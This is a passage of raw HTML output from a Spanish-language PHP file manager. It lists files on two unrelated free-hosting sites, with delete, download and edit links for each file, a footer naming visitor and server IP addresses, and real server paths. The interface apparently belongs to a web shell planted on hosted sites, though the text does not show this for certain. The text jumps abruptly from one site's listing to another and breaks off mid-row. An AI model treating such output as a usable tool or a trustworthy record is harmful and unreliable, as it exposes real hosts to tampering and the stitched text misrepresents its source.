                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::registro2.php">registro2.php</a></td>
                    <td>Archivo</td>
                    <td>4.05 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/registro2.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/registro2.php::registro2.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::registro2.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::registrooff.php">registrooff.php</a></td>
                    <td>Archivo</td>
                    <td>21.67 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/registrooff.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/registrooff.php::registrooff.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::registrooff.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::salir.php">salir.php</a></td>
                    <td>Archivo</td>
                    <td>299 B</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/salir.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/salir.php::salir.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::salir.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::session.php">session.php</a></td>
                    <td>Archivo</td>
                    <td>1.21 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/session.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/session.php::session.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::session.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::staff.php">staff.php</a></td>
                    <td>Archivo</td>
                    <td>4.16 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/staff.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/staff.php::staff.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::staff.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::tagcloud.php">tagcloud.php</a></td>
                    <td>Archivo</td>
                    <td>10.53 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/tagcloud.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/tagcloud.php::tagcloud.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::tagcloud.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::tagss.php">tagss.php</a></td>
                    <td>Archivo</td>
                    <td>50.48 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/tagss.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/tagss.php::tagss.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::tagss.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::terminos-y-condiciones.php">terminos-y-condiciones.php</a></td>
                    <td>Archivo</td>
                    <td>34.16 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/terminos-y-condiciones.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/terminos-y-condiciones.php::terminos-y-condiciones.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::terminos-y-condiciones.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::top.php">top.php</a></td>
                    <td>Archivo</td>
                    <td>32.88 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/top.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/top.php::top.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::top.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::trabajo.php">trabajo.php</a></td>
                    <td>Archivo</td>
                    <td>3.59 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/trabajo.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/trabajo.php::trabajo.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::trabajo.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::ultimos_comentarios.php">ultimos_comentarios.php</a></td>
                    <td>Archivo</td>
                    <td>899 B</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/ultimos_comentarios.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/ultimos_comentarios.php::ultimos_comentarios.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::ultimos_comentarios.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::usuarios.php">usuarios.php</a></td>
                    <td>Archivo</td>
                    <td>21.93 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/usuarios.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/usuarios.php::usuarios.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::usuarios.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::votar.php">votar.php</a></td>
                    <td>Archivo</td>
                    <td>2.71 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/votar.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/votar.php::votar.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::votar.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::x.php">x.php</a></td>
                    <td>Archivo</td>
                    <td>10.22 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/x.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/x.php::x.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::x.php">Editar</a>
                    </td>
                    </tr></table><div id="pie">
    <div id="pie_logo"></div><a id="servidor" href="http://189.245.74.75/">Tu IP: 189.245.74.75</a>
    <a id="servidor" href="http://209.190.85.12/">IP del servidor: 209.190.85.12</a>
    <span id="carga" href="#">0.458 seg</span>
    </div> <table>
            <tr class="primer_fila">
                <td></td>
                <td>Nombre</td>
                <td>Tipo</td>
                <td>Tamaño</td>
                <td>Permisos</td>
                <td class="opciones">Opciones</td>
            </tr><tr valign="top">
                        <td class="enlace"></td>
                        <td><a href="?dir::">.</a></td>
                        <td>Enlace</td>
                        <td></td>
                        <td><span class="no_permisos">---------</span></td>
                        <td></td>
                        </tr><tr valign="top">
                        <td class="enlace"></td>
                        <td><a href="?dir::">..</a></td>
                        <td>Enlace</td>
                        <td></td>
                        <td><span class="no_permisos">---------</span></td>
                        <td></td>
                    </tr><tr valign="top">
                    <td class="carpeta"></td>
                    <td><a href="?dir::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/Packages">Packages</a></td>
                    <td>Carpeta</td>
                    <td></td>
                    <td><span class="si_permisos">rwxr-x--x</span></td>
                    <td class="opciones"><a id="borrar" href="?borrar_carpeta::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/Packages::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::1">Borrar</a></td>
                    </tr><tr valign="top">
                    <td class="carpeta"></td>
                    <td><a href="?dir::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/Smileys">Smileys</a></td>
                    <td>Carpeta</td>
                    <td></td>
                    <td><span class="si_permisos">rwxr-x--x</span></td>
                    <td class="opciones"><a id="borrar" href="?borrar_carpeta::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/Smileys::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::1">Borrar</a></td>
                    </tr><tr valign="top">
                    <td class="carpeta"></td>
                    <td><a href="?dir::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/Sources">Sources</a></td>
                    <td>Carpeta</td>
                    <td></td>
                    <td><span class="si_permisos">rwxr-x--x</span></td>
                    <td class="opciones"><a id="borrar" href="?borrar_carpeta::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/Sources::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::1">Borrar</a></td>
                    </tr><tr valign="top">
                    <td class="carpeta"></td>
                    <td><a href="?dir::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/Themes">Themes</a></td>
                    <td>Carpeta</td>
                    <td></td>
                    <td><span class="si_permisos">rwxr-x--x</span></td>
                    <td class="opciones"><a id="borrar" href="?borrar_carpeta::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/Themes::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::1">Borrar</a></td>
                    </tr><tr valign="top">
                    <td class="carpeta"></td>
                    <td><a href="?dir::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/web">web</a></td>
                    <td>Carpeta</td>
                    <td></td>
                    <td><span class="si_permisos">rwxr-x--x</span></td>
                    <td class="opciones"><a id="borrar" href="?borrar_carpeta::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/web::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::1">Borrar</a></td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::.htaccess">.htaccess</a></td>
                    <td>Archivo</td>
                    <td>206 B</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/.htaccess::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/.htaccess::.htaccess::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::.htaccess">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::.htaccess.backup">.htaccess.backup</a></td>
                    <td>Archivo</td>
                    <td>787 B</td>
                    <td><span class="si_permisos">rw-rw-rw-</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/.htaccess.backup::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/.htaccess.backup::.htaccess.backup::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::.htaccess.backup">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::404.php">404.php</a></td>
                    <td>Archivo</td>
                    <td>45 B</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/404.php::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/404.php::404.php::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::404.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::DB.sql">DB.sql</a></td>
                    <td>Archivo</td>
                    <td>51.93 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/DB.sql::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/DB.sql::DB.sql::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::DB.sql">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::SSI.php">SSI.php</a></td>
                    <td>Archivo</td>
                    <td>12.13 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/SSI.php::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/SSI.php::SSI.php::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::SSI.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::Settings.php">Settings.php</a></td>
                    <td>Archivo</td>
                    <td>1016 B</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/Settings.php::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/Settings.php::Settings.php::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::Settings.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::SourcesSubs.php">SourcesSubs.php</a></td>
                    <td>Archivo</td>
                    <td>144.45 KB</td>
                    <td><span class="si_permisos">rw-rw-rw-</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/SourcesSubs.php::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/SourcesSubs.php::SourcesSubs.php::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::SourcesSubs.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::add_comment.php">add_comment.php</a></td>
                    <td>Archivo</td>
                    <td>2.66 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/add_comment.php::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/add_comment.php::add_comment.php::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::add_comment.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::comentarios.php">comentarios.php</a></td>
                    <td>Archivo</td>
                    <td>1.96 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/comentarios.php::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/comentarios.php::comentarios.php::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::comentarios.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::emoticones.php">emoticones.php</a></td>
                    <td>Archivo</td>
                    <td>1.05 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/emoticones.php::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/emoticones.php::emoticones.php::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::emoticones.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::favicon.ico">favicon.ico</a></td>
                    <td>Archivo</td>
                    <td>1.12 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/favicon.ico::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/favicon.ico::favicon.ico::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::favicon.ico">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::index.php">index.php</a></td>
                    <td>Archivo</td>
                    <td>11.18 KB</td>
                    <td><span class="si_permisos">rw-rw-rw-</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/index.php::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/index.php::index.php::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::index.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::php.ini">php.ini</a></td>
                    <td>Archivo</td>
                    <td>47 B</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/php.ini::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/php.ini::php.ini::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::php.ini">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::robots.txt">robots.txt</a></td>
                    <td>Archivo</td>
                    <td>244 B</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
